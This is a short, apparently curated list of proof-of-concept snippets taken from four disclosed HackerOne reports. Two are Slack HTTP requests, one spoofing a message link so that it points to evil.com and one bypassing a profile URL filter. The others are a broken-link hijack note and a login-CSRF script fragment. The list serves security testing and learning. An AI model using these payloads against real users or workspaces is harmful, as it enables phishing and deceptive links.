# Phishing & Social Engineering Vectors  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#481472](https://hackerone.com/reports/481472)  -  URL link spoofing
*low, $250*

```http
POST /api/chat.postMessage HTTP/1.1
 Host: example.slack.com

...
 -----------------------------87462859699239992111770463
 Content-Disposition: form-data; name="text"

-http://example.com
+<http://evil.com|http://example.com>
 -----------------------------87462859699239992111770463
 ...
```

## 2. [#500348](https://hackerone.com/reports/500348)  -  URL filter bypass in Enterprise Grid
*low, $100*

```http
POST /api/users.profile.set HTTP/1.1
 Host: example-corp.slack.com

-----------------------------7110134921404748136166706634
 Content-Disposition: form-data; name="profile"

-{"real_name":"Akaki Tsunoda","title":"","phone":"03-9999-0000","fields":{"XfABVBP467":{"value":"https://www.mcdonalds.com","alt":"McDonald's"}}}
+{"real_name":"Akaki Tsunoda","title":"","phone":"03-9999-0000","fields":{"XfABVBP467":{"value":"tel://03-9999-0000","alt":"McDonald's"}}}
 -----------------------------7110134921404748136166706634
 ...
```

## 3. [#1031321](https://hackerone.com/reports/1031321)  -  Github Account hijack through broken link in developer.twitter.com
*high*

```http
put this link https://github.com/HunterLarco

Please let me know if you have any questions. I am happy to help
```

## 4. [#1124540](https://hackerone.com/reports/1124540)  -  Login CSRF : Login Authentication Flaw on  https://liberapay.com/
*low*

```html
<script>history.pushState('', '', '/')</script>
```
